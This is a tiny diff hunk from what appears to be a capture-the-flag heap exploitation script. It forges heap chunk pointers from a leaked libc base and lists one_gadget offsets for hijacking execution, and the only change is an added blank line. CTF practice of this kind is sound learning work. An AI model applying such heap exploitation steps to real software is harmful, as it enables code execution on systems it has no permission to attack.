@@ -764,6 +764,7 @@ add(4,0x500)
 edit(0,p64(heap+0x510)+p64(libcbase+0x1ebfe0)+p64(heap+0x510)+p64(heap+0x510))
 edit(1,p64(libcbase+0x1ebfe0)+p64(heap)+p64(heap)+p64(heap))
 add(0,0x450)#fake_l
+
 add(4,0x460)
 	
 one=[0xe6c7e,0xe6c81,0xe6c84]
